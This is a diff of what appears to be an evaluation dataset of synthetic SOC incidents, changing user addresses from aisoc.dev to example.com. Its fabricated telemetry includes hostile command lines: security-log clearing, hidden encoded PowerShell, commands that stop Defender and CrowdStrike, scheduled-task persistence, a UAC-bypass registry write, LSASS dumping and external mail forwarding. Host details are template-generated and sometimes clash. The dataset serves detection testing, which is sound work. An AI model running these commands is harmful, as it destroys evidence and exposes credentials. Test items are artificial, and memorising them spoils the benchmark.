@@ -7446,8 +7446,8 @@
     "id": "INC-EVAL-164",
     "template_id": "vpn-new-geography",
     "template_index": 53,
-    "title": "Suspicious VPN login from new geography for bob@aisoc.dev",
-    "description": "VPN login for bob@aisoc.dev from 10.0.99.42 (new country, no prior history). Subsequent lateral SMB scan from VPN range to LIN-EDGE-VPN02.",
+    "title": "Suspicious VPN login from new geography for bob@example.com",
+    "description": "VPN login for bob@example.com from 10.0.99.42 (new country, no prior history). Subsequent lateral SMB scan from VPN range to LIN-EDGE-VPN02.",
     "expected_tactics": [
       "TA0001",
       "TA0008"
@@ -7463,7 +7463,7 @@
       "new geography",
       "lateral",
       "smb scan",
-      "bob@aisoc.dev",
+      "bob@example.com",
       "10.0.99.42",
       "LIN-EDGE-VPN02"
     ],
@@ -7471,7 +7471,7 @@
       {
         "source": "vpn",
         "action": "login_success",
-        "user": "bob@aisoc.dev",
+        "user": "bob@example.com",
         "src_ip": "10.0.99.42",
         "geo_country": "UA",
         "first_login_country": true
@@ -7482,7 +7482,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 5145,
         "Computer": "LIN-EDGE-VPN02",
-        "SubjectUserName": "bob@aisoc.dev",
+        "SubjectUserName": "bob@example.com",
         "ShareName": "\\\\*\\IPC$",
         "IpAddress": "10.0.99.42",
         "EventCount": 128
@@ -7494,7 +7494,7 @@
     "template_id": "service-account-privileged-command",
     "template_index": 54,
     "title": "Privileged command run as service account on K8S-PROD-CLUSTER",
-    "description": "Service account carol@aisoc.dev (no interactive use expected) ran privileged net.exe + wevtutil cl Security on K8S-PROD-CLUSTER. Anomalous.",
+    "description": "Service account carol@example.com (no interactive use expected) ran privileged net.exe + wevtutil cl Security on K8S-PROD-CLUSTER. Anomalous.",
     "expected_tactics": [
       "TA0005",
       "TA0006"
@@ -7509,7 +7509,7 @@
       "service account",
       "wevtutil",
       "log clear",
-      "carol@aisoc.dev",
+      "carol@example.com",
       "K8S-PROD-CLUSTER"
     ],
     "telemetry": [
@@ -7519,7 +7519,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "K8S-PROD-CLUSTER",
-        "User": "carol@aisoc.dev",
+        "User": "carol@example.com",
         "Image": "C:\\Windows\\System32\\wevtutil.exe",
         "CommandLine": "wevtutil cl Security",
         "LogonType": 5
@@ -7530,8 +7530,8 @@
     "id": "INC-EVAL-166",
     "template_id": "phishing-macro-email",
     "template_index": 0,
-    "title": "Spear-phishing email with macro-laden attachment delivered to ops-lead@aisoc.dev",
-    "description": "Inbound email from 203.0.113.45 delivered an Office document with a malicious VBA macro to ops-lead@aisoc.dev. Attachment opened on LIN-BUILD-CI03; macro spawned cmd.exe and downloaded a stage-2 payload from a known Emotet epoch 5 infrastructure.",
+    "title": "Spear-phishing email with macro-laden attachment delivered to ops-lead@example.com",
+    "description": "Inbound email from 203.0.113.45 delivered an Office document with a malicious VBA macro to ops-lead@example.com. Attachment opened on LIN-BUILD-CI03; macro spawned cmd.exe and downloaded a stage-2 payload from a known Emotet epoch 5 infrastructure.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -7547,7 +7547,7 @@
       "macro",
       "203.0.113.45",
       "LIN-BUILD-CI03",
-      "ops-lead@aisoc.dev",
+      "ops-lead@example.com",
       "stage-2 payload"
     ],
     "telemetry": [
@@ -7555,7 +7555,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "Send",
-        "UserId": "ops-lead@aisoc.dev",
+        "UserId": "ops-lead@example.com",
         "ClientIP": "203.0.113.45",
         "Subject": "Q4 invoice (action required)",
         "AttachmentNames": [
@@ -7568,7 +7568,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-BUILD-CI03",
-        "User": "ops-lead@aisoc.dev",
+        "User": "ops-lead@example.com",
         "Image": "C:\\Windows\\System32\\cmd.exe",
         "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "CommandLine": "cmd.exe /c powershell -nop -w hidden -enc <stage2>"
@@ -7578,7 +7578,7 @@
         "rule": "Office macro spawned cmd.exe",
         "severity": "high",
         "Computer": "LIN-BUILD-CI03",
-        "User": "ops-lead@aisoc.dev",
+        "User": "ops-lead@example.com",
         "threat_actor": "Emotet epoch 5"
       }
     ]
@@ -7634,7 +7634,7 @@
     "template_id": "confluence-watering-hole",
     "template_index": 2,
     "title": "Watering-hole exploit served from internal Confluence by 172.16.50.7",
-    "description": "Internal Confluence page injected with malicious JavaScript by 172.16.50.7. Drive-by exploit triggered browser exploitation on multiple visitors including svc-backup@aisoc.dev. Linked to ALPHV/BlackCat TTPs.",
+    "description": "Internal Confluence page injected with malicious JavaScript by 172.16.50.7. Drive-by exploit triggered browser exploitation on multiple visitors including svc-backup@example.com. Linked to ALPHV/BlackCat TTPs.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -7650,14 +7650,14 @@
       "drive-by",
       "Confluence",
       "172.16.50.7",
-      "svc-backup@aisoc.dev",
+      "svc-backup@example.com",
       "ALPHV/BlackCat"
     ],
     "telemetry": [
       {
         "source": "web_access",
         "http_method": "POST",
-        "url": "https://confluence.aisoc.dev/pages/editpage.action?pageId=8472",
+        "url": "https://confluence.example.com/pages/editpage.action?pageId=8472",
         "status_code": 200,
         "src_ip": "172.16.50.7",
         "user_agent": "Mozilla/5.0",
@@ -7668,7 +7668,7 @@
         "rule": "Browser exploitation: drive-by JavaScript loader",
         "severity": "high",
         "Computer": "WIN-HR-DESKTOP",
-        "User": "svc-backup@aisoc.dev",
+        "User": "svc-backup@example.com",
         "threat_actor": "ALPHV/BlackCat"
       }
     ]
@@ -7733,7 +7733,7 @@
     "template_id": "usb-autorun-airgap",
     "template_index": 4,
     "title": "Malicious USB autorun on air-gapped host AWS-EC2-PROD-API",
-    "description": "USB device inserted on air-gapped AWS-EC2-PROD-API by admin@aisoc.dev. AutoRun executed Python stager that collected local files. Data staged in C:\\Temp\\.",
+    "description": "USB device inserted on air-gapped AWS-EC2-PROD-API by admin@example.com. AutoRun executed Python stager that collected local files. Data staged in C:\\Temp\\.",
     "expected_tactics": [
       "TA0001",
       "TA0009"
@@ -7749,7 +7749,7 @@
       "autorun",
       "air-gapped",
       "AWS-EC2-PROD-API",
-      "admin@aisoc.dev",
+      "admin@example.com",
       "Python stager"
     ],
     "telemetry": [
@@ -7759,7 +7759,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 6416,
         "Computer": "AWS-EC2-PROD-API",
-        "SubjectUserName": "admin@aisoc.dev",
+        "SubjectUserName": "admin@example.com",
         "ClassName": "USB",
         "DeviceDescription": "SanDisk Cruzer 16GB"
       },
@@ -7769,7 +7769,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "AWS-EC2-PROD-API",
-        "User": "admin@aisoc.dev",
+        "User": "admin@example.com",
         "Image": "C:\\Python311\\python.exe",
         "ParentImage": "C:\\Windows\\System32\\rundll32.exe",
         "CommandLine": "python.exe E:\\autorun.py --stage C:\\Temp\\"
@@ -7780,8 +7780,8 @@
     "id": "INC-EVAL-171",
     "template_id": "oauth-consent-phish",
     "template_index": 5,
-    "title": "OAuth consent phishing targeting ceo@aisoc.dev",
-    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@aisoc.dev. Inbox forwarding rule created sending mail to 45.142.122.111.",
+    "title": "OAuth consent phishing targeting ceo@example.com",
+    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 45.142.122.111.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -7796,7 +7796,7 @@
       "OAuth consent",
       "Mail.Read",
       "Files.Read.All",
-      "ceo@aisoc.dev",
+      "ceo@example.com",
       "45.142.122.111",
       "forwarding rule"
     ],
@@ -7805,7 +7805,7 @@
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Consent to application.",
-        "UserId": "ceo@aisoc.dev",
+        "UserId": "ceo@example.com",
         "ApplicationId": "00000003-0000-0ff1-ce00-000000000000",
         "ConsentedScopes": [
           "Mail.Read",
@@ -7817,7 +7817,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "New-InboxRule",
-        "UserId": "ceo@aisoc.dev",
+        "UserId": "ceo@example.com",
         "Parameters": {
           "Name": "Auto-fwd",
           "ForwardTo": "ext@45.142.122.111",
@@ -7831,7 +7831,7 @@
     "template_id": "powershell-obfuscated-dropper",
     "template_index": 6,
     "title": "Obfuscated PowerShell dropper executed on AWS-EC2-PROD-API",
-    "description": "PowerShell dropper executed on AWS-EC2-PROD-API by grace@aisoc.dev; payload base64-encoded and decoded in-memory. Linked to Volt Typhoon ransomware staging.",
+    "description": "PowerShell dropper executed on AWS-EC2-PROD-API by grace@example.com; payload base64-encoded and decoded in-memory. Linked to Volt Typhoon ransomware staging.",
     "expected_tactics": [
       "TA0002",
       "TA0005"
@@ -7847,7 +7847,7 @@
       "obfuscated",
       "base64",
       "AWS-EC2-PROD-API",
-      "grace@aisoc.dev",
+      "grace@example.com",
       "Volt Typhoon"
     ],
     "telemetry": [
@@ -7857,7 +7857,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "AWS-EC2-PROD-API",
-        "User": "grace@aisoc.dev",
+        "User": "grace@example.com",
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "ParentImage": "C:\\Windows\\explorer.exe",
         "CommandLine": "powershell.exe -nop -w hidden -enc JABzAD0ATgB..."
@@ -7868,7 +7868,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4104,
         "Computer": "AWS-EC2-PROD-API",
-        "User": "grace@aisoc.dev",
+        "User": "grace@example.com",
         "ScriptBlockText": "$s=[System.Convert]::FromBase64String(...);[Reflection.Assembly]::Load($s).EntryPoint.Invoke(...)",
         "threat_actor": "Volt Typhoon"
       }
@@ -7980,7 +7980,7 @@
     "template_id": "wmi-event-subscription",
     "template_index": 9,
     "title": "Malicious WMI subscription on MAC-CFO-LAPTOP",
-    "description": "Permanent WMI event subscription created on MAC-CFO-LAPTOP by bob@aisoc.dev. Consumer runs encoded script. Persistence + execution mechanism.",
+    "description": "Permanent WMI event subscription created on MAC-CFO-LAPTOP by bob@example.com. Consumer runs encoded script. Persistence + execution mechanism.",
     "expected_tactics": [
       "TA0002",
       "TA0003"
@@ -7996,7 +7996,7 @@
       "subscription",
       "permanent",
       "MAC-CFO-LAPTOP",
-      "bob@aisoc.dev",
+      "bob@example.com",
       "encoded script"
     ],
     "telemetry": [
@@ -8006,7 +8006,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 19,
         "Computer": "MAC-CFO-LAPTOP",
-        "User": "bob@aisoc.dev",
+        "User": "bob@example.com",
         "EventNamespace": "ROOT\\Subscription",
         "Name": "UpdaterFilter",
         "Query": "SELECT * FROM __InstanceModificationEvent WITHIN 60"
@@ -8028,7 +8028,7 @@
     "id": "INC-EVAL-176",
     "template_id": "registry-run-persistence",
     "template_index": 10,
-    "title": "Registry Run key persistence created by eve@aisoc.dev on AWS-EC2-PROD-API",
+    "title": "Registry Run key persistence created by eve@example.com on AWS-EC2-PROD-API",
     "description": "New value written to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run on AWS-EC2-PROD-API. Points to roaming binary signed with revoked cert. Linked to APT29.",
     "expected_tactics": [
       "TA0003"
@@ -8043,7 +8043,7 @@
       "persistence",
       "revoked cert",
       "AWS-EC2-PROD-API",
-      "eve@aisoc.dev",
+      "eve@example.com",
       "APT29"
     ],
     "telemetry": [
@@ -8053,17 +8053,17 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "AWS-EC2-PROD-API",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKU\\S-1-5-21-...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
-        "Details": "C:\\Users\\eve@aisoc.dev\\AppData\\Roaming\\updater.exe"
+        "Details": "C:\\Users\\eve@example.com\\AppData\\Roaming\\updater.exe"
       },
       {
         "source": "edr",
         "rule": "Persistence: Registry Run with revoked-cert signed binary",
         "severity": "high",
         "Computer": "AWS-EC2-PROD-API",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "threat_actor": "APT29"
       }
     ]
@@ -8073,7 +8073,7 @@
     "template_id": "scheduled-task-persistence",
     "template_index": 11,
     "title": "Scheduled task persistence on WIN-DC-SECONDARY",
-    "description": "Hidden scheduled task created on WIN-DC-SECONDARY by svc-deploy@aisoc.dev: triggers every 30 minutes, runs script from %APPDATA%\\Roaming. Persistence mechanism.",
+    "description": "Hidden scheduled task created on WIN-DC-SECONDARY by svc-deploy@example.com: triggers every 30 minutes, runs script from %APPDATA%\\Roaming. Persistence mechanism.",
     "expected_tactics": [
       "TA0003"
     ],
@@ -8087,7 +8087,7 @@
       "persistence",
       "APPDATA",
       "WIN-DC-SECONDARY",
-      "svc-deploy@aisoc.dev"
+      "svc-deploy@example.com"
     ],
     "telemetry": [
       {
@@ -8096,7 +8096,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4698,
         "Computer": "WIN-DC-SECONDARY",
-        "SubjectUserName": "svc-deploy@aisoc.dev",
+        "SubjectUserName": "svc-deploy@example.com",
         "TaskName": "\\Microsoft\\Windows\\UpdaterTask",
         "TaskContent": "<Hidden>true</Hidden><Exec>%APPDATA%\\Roaming\\u.ps1</Exec>"
       },
@@ -8109,7 +8109,7 @@
         "Image": "C:\\Windows\\System32\\schtasks.exe",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
         "CommandLine": "schtasks /Create /SC MINUTE /MO 30 /TN UpdaterTask /TR \"powershell -f %APPDATA%\\Roaming\\u.ps1\" /F",
-        "User": "svc-deploy@aisoc.dev"
+        "User": "svc-deploy@example.com"
       }
     ]
   },
@@ -8161,7 +8161,7 @@
     "template_id": "cron-backdoor",
     "template_index": 13,
     "title": "Backdoor cron job installed on LIN-BUILD-CI03",
-    "description": "/etc/cron.d entry created by alice@aisoc.dev on LIN-BUILD-CI03. Reverse shell beacon to 10.0.99.42 every 5 minutes.",
+    "description": "/etc/cron.d entry created by alice@example.com on LIN-BUILD-CI03. Reverse shell beacon to 10.0.99.42 every 5 minutes.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -8177,7 +8177,7 @@
       "backdoor",
       "reverse shell",
       "LIN-BUILD-CI03",
-      "alice@aisoc.dev",
+      "alice@example.com",
       "10.0.99.42"
     ],
     "telemetry": [
@@ -8188,7 +8188,7 @@
         "exe": "/usr/bin/vi",
         "path": "/etc/cron.d/zz-update",
         "hostname": "LIN-BUILD-CI03",
-        "user": "alice@aisoc.dev",
+        "user": "alice@example.com",
         "a2": "O_WRONLY|O_CREAT"
       },
       {
@@ -8204,7 +8204,7 @@
     "template_id": "uac-bypass-fodhelper",
     "template_index": 14,
     "title": "UAC bypass observed on LIN-BUILD-CI03",
-    "description": "fodhelper.exe abuse on LIN-BUILD-CI03 by cfo@aisoc.dev; auto-elevation triggered without prompt. Process tree shows escalation to SYSTEM.",
+    "description": "fodhelper.exe abuse on LIN-BUILD-CI03 by cfo@example.com; auto-elevation triggered without prompt. Process tree shows escalation to SYSTEM.",
     "expected_tactics": [
       "TA0004",
       "TA0005"
@@ -8219,7 +8219,7 @@
       "fodhelper",
       "auto-elevation",
       "LIN-BUILD-CI03",
-      "cfo@aisoc.dev",
+      "cfo@example.com",
       "SYSTEM"
     ],
     "telemetry": [
@@ -8229,7 +8229,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "LIN-BUILD-CI03",
-        "User": "cfo@aisoc.dev",
+        "User": "cfo@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
         "Details": "C:\\Windows\\System32\\cmd.exe /c whoami"
@@ -8252,7 +8252,7 @@
     "template_id": "k8s-privileged-pod-escape",
     "template_index": 15,
     "title": "Container escape via privileged pod on WIN-DC-SECONDARY",
-    "description": "Kubernetes privileged pod created on WIN-DC-SECONDARY by dave@aisoc.dev. cgroup escape to host namespace observed. Node filesystem accessed.",
+    "description": "Kubernetes privileged pod created on WIN-DC-SECONDARY by dave@example.com. cgroup escape to host namespace observed. Node filesystem accessed.",
     "expected_tactics": [
       "TA0004",
       "TA0007"
@@ -8269,7 +8269,7 @@
       "container escape",
       "cgroup",
       "WIN-DC-SECONDARY",
-      "dave@aisoc.dev"
+      "dave@example.com"
     ],
     "telemetry": [
       {
@@ -8281,7 +8281,7 @@
           "resource": "pods"
         },
         "user": {
-          "username": "dave@aisoc.dev"
+          "username": "dave@example.com"
         },
         "requestObject": {
           "spec": {
@@ -8319,7 +8319,7 @@
     "template_id": "linux-suid-abuse",
     "template_index": 16,
     "title": "Linux SUID binary abuse on WIN-DC-SECONDARY",
-    "description": "Custom SUID binary discovered in /tmp on WIN-DC-SECONDARY; allows arbitrary command execution as root. Likely escalation by carol@aisoc.dev.",
+    "description": "Custom SUID binary discovered in /tmp on WIN-DC-SECONDARY; allows arbitrary command execution as root. Likely escalation by carol@example.com.",
     "expected_tactics": [
       "TA0004"
     ],
@@ -8333,7 +8333,7 @@
       "/tmp",
       "root escalation",
       "WIN-DC-SECONDARY",
-      "carol@aisoc.dev"
+      "carol@example.com"
     ],
     "telemetry": [
       {
@@ -8344,7 +8344,7 @@
         "a1": "/tmp/.x",
         "mode": "04755",
         "hostname": "WIN-DC-SECONDARY",
-        "user": "carol@aisoc.dev"
+        "user": "carol@example.com"
       },
       {
         "source": "linux_auditd",
@@ -8354,7 +8354,7 @@
         "hostname": "WIN-DC-SECONDARY",
         "uid": 1001,
         "euid": 0,
-        "user": "carol@aisoc.dev"
+        "user": "carol@example.com"
       }
     ]
   },
@@ -8420,7 +8420,7 @@
     "template_id": "event-log-cleared",
     "template_index": 18,
     "title": "Indicator removal: Windows event log cleared on LIN-EDGE-VPN02",
-    "description": "Security event log cleared on LIN-EDGE-VPN02 by admin@aisoc.dev. wevtutil.exe cl Security observed in command-line telemetry.",
+    "description": "Security event log cleared on LIN-EDGE-VPN02 by admin@example.com. wevtutil.exe cl Security observed in command-line telemetry.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -8434,7 +8434,7 @@
       "log cleared",
       "indicator removal",
       "LIN-EDGE-VPN02",
-      "admin@aisoc.dev"
+      "admin@example.com"
     ],
     "telemetry": [
       {
@@ -8443,7 +8443,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 1102,
         "Computer": "LIN-EDGE-VPN02",
-        "SubjectUserName": "admin@aisoc.dev",
+        "SubjectUserName": "admin@example.com",
         "Channel": "Security",
         "Description": "The audit log was cleared."
       },
@@ -8453,7 +8453,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-EDGE-VPN02",
-        "User": "admin@aisoc.dev",
+        "User": "admin@example.com",
         "Image": "C:\\Windows\\System32\\wevtutil.exe",
         "CommandLine": "wevtutil cl Security"
       }
@@ -8464,7 +8464,7 @@
     "template_id": "disable-edr-tooling",
     "template_index": 19,
     "title": "Disable security tooling on LIN-K8S-NODE01",
-    "description": "bob@aisoc.dev attempted to stop Defender, CrowdStrike, and Sysmon on LIN-K8S-NODE01. Tampering telemetry triggered alert.",
+    "description": "bob@example.com attempted to stop Defender, CrowdStrike, and Sysmon on LIN-K8S-NODE01. Tampering telemetry triggered alert.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -8479,7 +8479,7 @@
       "sysmon",
       "tampering",
       "LIN-K8S-NODE01",
-      "bob@aisoc.dev"
+      "bob@example.com"
     ],
     "telemetry": [
       {
@@ -8488,7 +8488,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-K8S-NODE01",
-        "User": "bob@aisoc.dev",
+        "User": "bob@example.com",
         "Image": "C:\\Windows\\System32\\sc.exe",
         "CommandLine": "sc.exe stop CSAgent"
       },
@@ -8498,7 +8498,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-K8S-NODE01",
-        "User": "bob@aisoc.dev",
+        "User": "bob@example.com",
         "Image": "C:\\Windows\\System32\\sc.exe",
         "CommandLine": "sc.exe stop WinDefend"
       },
@@ -8507,7 +8507,7 @@
         "rule": "EDR tampering attempt",
         "severity": "critical",
         "Computer": "LIN-K8S-NODE01",
-        "User": "bob@aisoc.dev"
+        "User": "bob@example.com"
       }
     ]
   },
@@ -8515,7 +8515,7 @@
     "id": "INC-EVAL-186",
     "template_id": "lsass-memory-dump",
     "template_index": 20,
-    "title": "LSASS memory dump on K8S-PROD-CLUSTER by svc-deploy@aisoc.dev",
+    "title": "LSASS memory dump on K8S-PROD-CLUSTER by svc-deploy@example.com",
     "description": "comsvcs.dll MiniDump observed on K8S-PROD-CLUSTER. lsass.exe memory dumped to C:\\Windows\\Temp\\. Mimikatz signatures detected.",
     "expected_tactics": [
       "TA0006"
@@ -8531,7 +8531,7 @@
       "comsvcs",
       "mimikatz",
       "K8S-PROD-CLUSTER",
-      "svc-deploy@aisoc.dev"
+      "svc-deploy@example.com"
     ],
     "telemetry": [
       {
@@ -8544,7 +8544,7 @@
         "TargetImage": "C:\\Windows\\System32\\lsass.exe",
         "GrantedAccess": "0x1010",
         "CallTrace": "comsvcs.dll+5d24|MiniDumpWriteDump",
-        "User": "svc-deploy@aisoc.dev"
+        "User": "svc-deploy@example.com"
       },
       {
         "source": "sysmon",
@@ -8554,7 +8554,7 @@
         "Computer": "K8S-PROD-CLUSTER",
         "Image": "C:\\Windows\\System32\\rundll32.exe",
         "TargetFilename": "C:\\Windows\\Temp\\lsass.dmp",
-        "User": "svc-deploy@aisoc.dev"
+        "User": "svc-deploy@example.com"
       }
     ]
   },
@@ -8562,8 +8562,8 @@
     "id": "INC-EVAL-187",
     "template_id": "credential-spray",
     "template_index": 21,
-    "title": "Brute-force credential spray against svc-deploy@aisoc.dev from 198.51.100.23",
-    "description": "Credential spray from 198.51.100.23 against svc-deploy@aisoc.dev. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
+    "title": "Brute-force credential spray against svc-deploy@example.com from 198.51.100.23",
+    "description": "Credential spray from 198.51.100.23 against svc-deploy@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
     "expected_tactics": [
       "TA0006"
     ],
@@ -8575,7 +8575,7 @@
     "evidence_keywords": [
       "brute force",
       "credential spray",
-      "svc-deploy@aisoc.dev",
+      "svc-deploy@example.com",
       "198.51.100.23",
       "azure ad"
     ],
@@ -8583,7 +8583,7 @@
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "svc-deploy@aisoc.dev",
+        "userPrincipalName": "svc-deploy@example.com",
         "ipAddress": "198.51.100.23",
         "resultType": 50126,
         "resultDescription": "Invalid username or password",
@@ -8593,7 +8593,7 @@
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "svc-deploy@aisoc.dev",
+        "userPrincipalName": "svc-deploy@example.com",
         "ipAddress": "198.51.100.23",
         "resultType": 0,
         "resultDescription": "Success",
@@ -8607,7 +8607,7 @@
     "template_id": "kerberoasting",
     "template_index": 22,
     "title": "Kerberoasting from WIN-FIN-DB01",
-    "description": "Service account TGS tickets requested en-masse from WIN-FIN-DB01 by dave@aisoc.dev. AES256 \u2192 RC4 downgrade observed. Mimikatz tooling indicators.",
+    "description": "Service account TGS tickets requested en-masse from WIN-FIN-DB01 by dave@example.com. AES256 \u2192 RC4 downgrade observed. Mimikatz tooling indicators.",
     "expected_tactics": [
       "TA0006",
       "TA0008"
@@ -8624,7 +8624,7 @@
       "RC4",
       "mimikatz",
       "WIN-FIN-DB01",
-      "dave@aisoc.dev"
+      "dave@example.com"
     ],
     "telemetry": [
       {
@@ -8633,8 +8633,8 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4769,
         "Computer": "WIN-DC-PRIMARY",
-        "TargetUserName": "dave@aisoc.dev",
-        "ServiceName": "MSSQLSvc/sql.aisoc.dev",
+        "TargetUserName": "dave@example.com",
+        "ServiceName": "MSSQLSvc/sql.example.com",
         "TicketEncryptionType": "0x17",
         "IpAddress": "WIN-FIN-DB01"
       },
@@ -8644,8 +8644,8 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4769,
         "Computer": "WIN-DC-PRIMARY",
-        "TargetUserName": "dave@aisoc.dev",
-        "ServiceName": "HTTP/web01.aisoc.dev",
+        "TargetUserName": "dave@example.com",
+        "ServiceName": "HTTP/web01.example.com",
         "TicketEncryptionType": "0x17",
         "IpAddress": "WIN-FIN-DB01"
       }
@@ -8656,7 +8656,7 @@
     "template_id": "ad-dcsync",
     "template_index": 23,
     "title": "Active Directory DCSync from non-DC host LIN-OBS-LOGGER",
-    "description": "Replication rights abused from LIN-OBS-LOGGER by ops-lead@aisoc.dev. All domain NTLM hashes replicated. Severe credential exposure.",
+    "description": "Replication rights abused from LIN-OBS-LOGGER by ops-lead@example.com. All domain NTLM hashes replicated. Severe credential exposure.",
     "expected_tactics": [
       "TA0006",
       "TA0004"
@@ -8672,7 +8672,7 @@
       "replication",
       "ntlm hash",
       "LIN-OBS-LOGGER",
-      "ops-lead@aisoc.dev"
+      "ops-lead@example.com"
     ],
     "telemetry": [
       {
@@ -8681,7 +8681,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4662,
         "Computer": "WIN-DC-PRIMARY",
-        "SubjectUserName": "ops-lead@aisoc.dev",
+        "SubjectUserName": "ops-lead@example.com",
         "ObjectServer": "DS",
         "ObjectType": "domainDNS",
         "Properties": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
@@ -8693,8 +8693,8 @@
     "id": "INC-EVAL-190",
     "template_id": "saml-golden-ticket",
     "template_index": 24,
-    "title": "SAML golden-ticket: forged assertion targeting heidi@aisoc.dev",
-    "description": "Forged SAML assertion detected for heidi@aisoc.dev. Attacker pivoted to Azure AD; account enumeration followed from 198.51.100.23.",
+    "title": "SAML golden-ticket: forged assertion targeting heidi@example.com",
+    "description": "Forged SAML assertion detected for heidi@example.com. Attacker pivoted to Azure AD; account enumeration followed from 198.51.100.23.",
     "expected_tactics": [
       "TA0006",
       "TA0007"
@@ -8710,14 +8710,14 @@
       "golden ticket",
       "forged",
       "azure ad",
-      "heidi@aisoc.dev",
+      "heidi@example.com",
       "198.51.100.23"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "heidi@aisoc.dev",
+        "userPrincipalName": "heidi@example.com",
         "ipAddress": "198.51.100.23",
         "resultType": 0,
         "authenticationDetails": [
@@ -8727,13 +8727,13 @@
           }
         ],
         "tokenIssuerType": "ADFederationServices",
-        "tokenIssuerName": "forged-adfs.aisoc.dev"
+        "tokenIssuerName": "forged-adfs.example.com"
       },
       {
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Add member to role.",
-        "UserId": "heidi@aisoc.dev",
+        "UserId": "heidi@example.com",
         "ModifiedProperties": [
           {
             "Name": "Role.DisplayName",
@@ -8748,7 +8748,7 @@
     "template_id": "ldap-bloodhound-discovery",
     "template_index": 25,
     "title": "Domain enumeration from AWS-EC2-PROD-API",
-    "description": "ldap discovery from AWS-EC2-PROD-API by bob@aisoc.dev: BloodHound-style queries enumerating users, groups, ACLs.",
+    "description": "ldap discovery from AWS-EC2-PROD-API by bob@example.com: BloodHound-style queries enumerating users, groups, ACLs.",
     "expected_tactics": [
       "TA0007"
     ],
@@ -8762,7 +8762,7 @@
       "bloodhound",
       "domain enumeration",
       "AWS-EC2-PROD-API",
-      "bob@aisoc.dev"
+      "bob@example.com"
     ],
     "telemetry": [
       {
@@ -8774,7 +8774,7 @@
         "Image": "C:\\Tools\\SharpHound.exe",
         "DestinationIp": "WIN-DC-PRIMARY",
         "DestinationPort": 389,
-        "User": "bob@aisoc.dev"
+        "User": "bob@example.com"
       },
       {
         "source": "windows_security",
@@ -8782,7 +8782,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4662,
         "Computer": "WIN-DC-PRIMARY",
-        "SubjectUserName": "bob@aisoc.dev",
+        "SubjectUserName": "bob@example.com",
         "ObjectType": "user",
         "AccessMask": "0x100",
         "EventCount": 8400
@@ -8794,7 +8794,7 @@
     "template_id": "smb-share-enumeration",
     "template_index": 26,
     "title": "Network share enumeration on LIN-DB-REPLICA",
-    "description": "Mass SMB share enumeration from LIN-DB-REPLICA by svc-deploy@aisoc.dev; net.exe and PowerShell Get-SmbShare invocations across /24 subnet.",
+    "description": "Mass SMB share enumeration from LIN-DB-REPLICA by svc-deploy@example.com; net.exe and PowerShell Get-SmbShare invocations across /24 subnet.",
     "expected_tactics": [
       "TA0007"
     ],
@@ -8809,7 +8809,7 @@
       "Get-SmbShare",
       "share enumeration",
       "LIN-DB-REPLICA",
-      "svc-deploy@aisoc.dev"
+      "svc-deploy@example.com"
     ],
     "telemetry": [
       {
@@ -8818,7 +8818,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-DB-REPLICA",
-        "User": "svc-deploy@aisoc.dev",
+        "User": "svc-deploy@example.com",
         "Image": "C:\\Windows\\System32\\net.exe",
         "CommandLine": "net.exe view /domain"
       },
@@ -8828,7 +8828,7 @@
